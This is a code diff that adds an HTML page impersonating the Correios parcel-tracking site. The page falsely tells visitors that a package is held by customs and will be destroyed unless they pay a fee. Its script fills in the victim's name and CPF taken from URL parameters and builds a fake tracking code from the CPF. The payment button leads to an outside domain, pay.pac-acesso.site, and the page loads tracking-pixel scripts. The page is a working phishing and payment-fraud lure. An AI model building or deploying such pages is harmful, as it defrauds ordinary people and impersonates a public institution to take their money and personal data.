@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <script src="assets/js/protect.js?v=20260814clear"></script>
+  <script src="assets/js/pixel-loader-utmify.js"></script>
+  <script src="assets/js/pixel-utmify.js"></script>
+  <meta name="theme-color" content="#003366">
+  <title>Rastreamento | Correios</title>
+  <link rel="stylesheet" href="assets/css/correios-mobile.css?v=20260814g">
+</head>
+<body>
+  <div class="page page-index4">
+    <header class="index4-top">
+      <img src="assets/img/logo-correios-header.png" alt="Correios" class="index4-logo">
+      <div class="index4-user">
+        <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><path fill="#003366" d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+        <span>Olá, <strong id="primeiroNome">Cliente</strong></span>
+      </div>
+    </header>
+
+    <div class="index4-divider"></div>
+
+    <div class="index4-content">
+      <p class="index4-breadcrumb">Portal Correios &gt; Rastreamento &gt; <span id="cpfBreadcrumb">000.000.000-00</span></p>
+
+      <div class="index4-alert-title">
+        <span class="index4-alert-bar"></span>
+        <h1>VOCÊ TEM UM PACOTE RETIDO NA FISCALIZAÇÃO!</h1>
+      </div>
+
+      <div class="index4-tracking-box" id="codigoRastreio">DA 000 000 000 BR</div>
+
+      <p class="index4-status-wait">
+        <span class="index4-status-dot"></span>
+        AGUARDANDO PAGAMENTO
+      </p>
+
+      <div class="index4-info-card">
+        <p><strong>Situação:</strong> Objeto retido na fiscalização aduaneira.</p>
+        <p><strong>Prazo final de retenção:</strong> <span id="prazoFinal">14/08/2026 às 23:59</span></p>
+        <p><strong>Unidade de entrega responsável:</strong> <span id="unidadeEntrega">Centro de Distribuição de Candeias/MG</span></p>
+        <p class="index4-info-warning">
+          <strong>Atenção:</strong> Após o prazo, a Receita Federal poderá determinar a <strong>DESTRUIÇÃO</strong> ou devolução do objeto. A regularização é a única forma de garantir o recebimento.
+        </p>
+      </div>
+
+      <a href="#" id="link-regularizar" class="btn-index4-action">📦 REGULARIZAR E LIBERAR ENTREGA</a>
+
+      <div class="index4-notice">
+        <p class="index4-notice-title">📄 Aviso de objeto tributado:</p>
+        <img src="assets/img/pacote.png" alt="Pacote com etiqueta de objeto tributado pela Receita Federal" class="index4-pacote-img">
+      </div>
+
+      <div class="index4-timeline-wrap">
+        <div class="index4-track-code" id="codigoTimeline">DA 000 000 000 BR</div>
+
+        <ol class="index4-track">
+          <li class="index4-track-item">
+            <div class="index4-track-icon" aria-hidden="true">
+              <img src="assets/img/icone.png" alt="" class="index4-track-logo">
+            </div>
+            <div class="index4-track-body">
+              <p class="index4-track-title">Previsão de Entrega da Mercadoria</p>
+              <p class="index4-track-text">Dia <span id="dataPrevisao">18/08/2026</span></p>
+            </div>
+          </li>
+
+          <li class="index4-track-item index4-track-item-alert">
+            <div class="index4-track-icon" aria-hidden="true">
+              <svg viewBox="0 0 24 24" width="20" height="20"><path fill="#003366" d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"/></svg>
+            </div>
+            <div class="index4-track-body">
+              <p class="index4-track-title index4-track-title-alert">Pendência fiscal identificada</p>
+              <p class="index4-track-text">Objeto aguardando regularização fiscal. Taxa de despacho pendente para liberação.</p>
+              <time class="index4-track-time" id="dataPendencia">13/08/2026 13:12</time>
+              <p class="index4-track-pay">
+                Realize o pagamento:
+                <a href="#" id="link-pagamento">Clique Aqui Para Efetuar o Pagamento</a>
+              </p>
+            </div>
+          </li>
+
+          <li class="index4-track-item">
+            <div class="index4-track-icon" aria-hidden="true">
+              <svg viewBox="0 0 24 24" width="20" height="20"><path fill="#003366" d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C8.01 14 6 11.99 6 9.5S8.01 5 10.5 5 15 7.01 15 9.5 12.99 14 10.5 14z"/></svg>
+            </div>
+            <div class="index4-track-body">
+              <p class="index4-track-title">Objeto em análise fiscal</p>
+              <p class="index4-track-text">Em análise pela fiscalização aduaneira. Aguardando verificação da Receita Federal.</p>
+              <time class="index4-track-time" id="dataAnalise">12/08/2026 10:39</time>
+            </div>
+          </li>
+
+          <li class="index4-track-item">
+            <div class="index4-track-icon" aria-hidden="true">
+              <svg viewBox="0 0 24 24" width="20" height="20"><path fill="#003366" d="M18 18.5a1.5 1.5 0 100-3 1.5 1.5 0 000 3zM6 18.5a1.5 1.5 0 100-3 1.5 1.5 0 000 3zM20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2a3 3 0 016 0h6a3 3 0 016 0h2v-5l-3-4zM6 18.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm13.5-9l1.96 2.5H17V9.5h2.5zm-1.5 9c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg>
+            </div>
+            <div class="index4-track-body">
+              <p class="index4-track-title">Objeto em transferência</p>
+              <p class="index4-track-text">Em trânsito para o <span id="unidadeTimeline">Centro de Distribuição de Candeias/MG</span>. Processamento em andamento.</p>
+              <time class="index4-track-time" id="dataTransferencia">11/08/2026 08:22</time>
+            </div>
+          </li>
+
+          <li class="index4-track-item">
+            <div class="index4-track-icon" aria-hidden="true">
+              <svg viewBox="0 0 24 24" width="20" height="20"><path fill="#003366" d="M18 18H6v-2h12v2zM7 16V7h2v9H7zm4 0V7h2v9h-2zm4 0V7h2v9h-2zM8 5h8l1 2H7l1-2z"/></svg>
+            </div>
+            <div class="index4-track-body">
+              <p class="index4-track-title">Objeto recebido na unidade</p>
+              <p class="index4-track-text" id="textoRecebidoUnidade">Objeto recebido na unidade de tratamento e encaminhado para triagem.</p>
+              <time class="index4-track-time" id="dataRecebido">09/08/2026 10:59</time>
+            </div>
+          </li>
+
+          <li class="index4-track-item">
+            <div class="index4-track-icon" aria-hidden="true">
+              <svg viewBox="0 0 24 24" width="20" height="20"><path fill="#003366" d="M21 16V8a2 2 0 00-1-1.73l-7-4a2 2 0 00-2 0l-7 4A2 2 0 003 8v8a2 2 0 001 1.73l7 4a2 2 0 002 0l7-4A2 2 0 0021 16z"/></svg>
+            </div>
+            <div class="index4-track-body">
+              <p class="index4-track-title">Objeto Postado</p>
+              <p class="index4-track-text">Objeto postado e registrado no sistema dos Correios.</p>
+              <time class="index4-track-time" id="dataPostado">07/08/2026 09:39</time>
+            </div>
+          </li>
+        </ol>
+
+        <div class="index4-superapp">
+          <div class="index4-superapp-copy">
+            <strong>Sua nova experiência Correios está aqui</strong>
+            <span>Produtos, serviços e novidades agora no SuperApp.</span>
+            <em>Baixe e aproveite.</em>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer-gov index4-footer">
+      <img src="assets/img/rodape2.png" alt="Correios - Governo Federal" class="footer-rodape">
+    </footer>
+  </div>
+
+  <script src="assets/js/dynamic-context.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const params = new URLSearchParams(window.location.search);
+      const nome = params.get("nome") || "";
+      const cpf = params.get("cpf") || "";
+
+      if (!cpf || !nome) {
+        window.location.href = "index.html";
+        return;
+      }
+
+      const primeiroNome = nome.trim().split(/\s+/)[0] || "Cliente";
+      document.getElementById("primeiroNome").textContent = primeiroNome.charAt(0).toUpperCase() + primeiroNome.slice(1).toLowerCase();
+      document.getElementById("cpfBreadcrumb").textContent = cpf;
+
+      function gerarCodigoRastreio(cpfValor) {
+        const digits = (cpfValor || "").replace(/\D/g, "");
+        const base = digits.slice(0, 9) || "795188047";
+        const num = String(100000000 + (parseInt(base, 10) % 900000000)).padStart(9, "0");
+        const parte = num.slice(0, 3) + " " + num.slice(3, 6) + " " + num.slice(6, 9);
+        return "DA " + parte + " BR";
+      }
+
+      const codigo = gerarCodigoRastreio(cpf);
+
+      document.getElementById("codigoRastreio").textContent = codigo;
+      document.getElementById("codigoTimeline").textContent = codigo;
+      document.getElementById("link-regularizar").href = "https://pay.pac-acesso.site/rn4RgQAxLp8gwBV";
+      document.getElementById("link-pagamento").href = "index5.html" + window.location.search;
+
+      CorreiosContext.applyTrackingPage();
+    });
+  </script>
+</body>
+</html>
